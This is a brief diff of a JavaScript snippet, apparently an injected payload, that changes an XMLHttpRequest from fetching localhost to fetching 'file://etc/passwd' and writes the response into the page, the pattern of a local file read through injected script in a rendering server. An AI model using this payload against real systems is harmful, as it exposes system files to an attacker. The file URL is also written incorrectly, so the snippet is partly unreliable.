@@ -3,7 +3,7 @@
 x.onload=function(){
 document.write(this.responseText)
 };
-x.open("GET","http://127.0.0.1");
+x.open("GET","file://etc/passwd");
 x.send();
     document.getElementById('my').innerHTML=x;
     
